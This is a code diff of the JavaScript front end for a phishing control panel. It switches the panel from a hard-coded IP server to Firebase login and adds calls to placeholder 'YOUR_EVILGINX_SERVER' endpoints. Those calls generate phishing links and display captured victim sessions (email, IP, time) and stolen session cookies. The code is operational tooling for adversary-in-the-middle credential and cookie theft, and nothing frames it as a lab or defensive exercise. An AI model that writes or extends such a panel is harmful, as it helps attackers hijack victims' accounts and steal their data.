@@ -1,52 +1,60 @@
-const API_BASE_URL = "http://3.149.242.245:5000";  // Updated to Port 5000
+const firebaseConfig = {
+    apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
+    authDomain: "panel-auth-134b7.firebaseapp.com",
+    projectId: "panel-auth-134b7",
+    storageBucket: "panel-auth-134b7.firebasestorage.app",
+    messagingSenderId: "892746068340",
+    appId: "Y1:892746068340:web:f8c4d5b798e8bc48447c21"
+};
 
-// Generate Link Function
-async function generatePhishingLink(lureId) {
-    try {
-        let response = await fetch(`${API_BASE_URL}/generate_link`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ lure_id: lureId })
-        });
-        let data = await response.json();
-        if (data.link) {
-            alert(`Generated Link: ${data.link}`);
-        } else {
-            alert("Error generating link.");
-        }
-    } catch (error) {
-        console.error("Error:", error);
+firebase.initializeApp(firebaseConfig);
+const auth = firebase.auth();
+
+auth.onAuthStateChanged(user => {
+    if (!user) {
+        window.location.href = "index.html";
     }
+});
+
+function generateLink() {
+    fetch("http://YOUR_EVILGINX_SERVER/api/generate-link")
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("content").innerHTML = `<p>Generated Link: <a href="${data.link}" target="_blank">${data.link}</a></p>`;
+        })
+        .catch(error => console.error("Error generating link:", error));
 }
 
-// Fetch Captured Sessions
-async function fetchCapturedSessions() {
-    try {
-        let response = await fetch(`${API_BASE_URL}/captured_sessions`);
-        let data = await response.json();
-        if (data) {
-            console.log("Captured Sessions:", data);
-            // Update table dynamically
-        } else {
-            alert("No captured sessions.");
-        }
-    } catch (error) {
-        console.error("Error:", error);
-    }
+function loadCapturedSessions() {
+    fetch("http://YOUR_EVILGINX_SERVER/api/captured-sessions")
+        .then(response => response.json())
+        .then(data => {
+            let html = "<h3>Captured Sessions</h3><table><tr><th>Email</th><th>IP</th><th>Time</th></tr>";
+            data.sessions.forEach(session => {
+                html += `<tr><td>${session.email}</td><td>${session.ip}</td><td>${session.time}</td></tr>`;
+            });
+            html += "</table>";
+            document.getElementById("content").innerHTML = html;
+        })
+        .catch(error => console.error("Error loading sessions:", error));
 }
 
-// Fetch Cookies
-async function fetchCookies() {
-    try {
-        let response = await fetch(`${API_BASE_URL}/get_cookies`);
-        let data = await response.json();
-        if (data) {
-            console.log("Cookies:", data);
-            // Update table dynamically
-        } else {
-            alert("No cookies found.");
-        }
-    } catch (error) {
-        console.error("Error:", error);
-    }
+function loadCookies() {
+    fetch("http://YOUR_EVILGINX_SERVER/api/cookies")
+        .then(response => response.json())
+        .then(data => {
+            let html = "<h3>Cookies</h3><table><tr><th>Name</th><th>Value</th></tr>";
+            data.cookies.forEach(cookie => {
+                html += `<tr><td>${cookie.name}</td><td>${cookie.value}</td></tr>`;
+            });
+            html += "</table>";
+            document.getElementById("content").innerHTML = html;
+        })
+        .catch(error => console.error("Error loading cookies:", error));
+}
+
+function logout() {
+    auth.signOut().then(() => {
+        window.location.href = "index.html";
+    });
 }
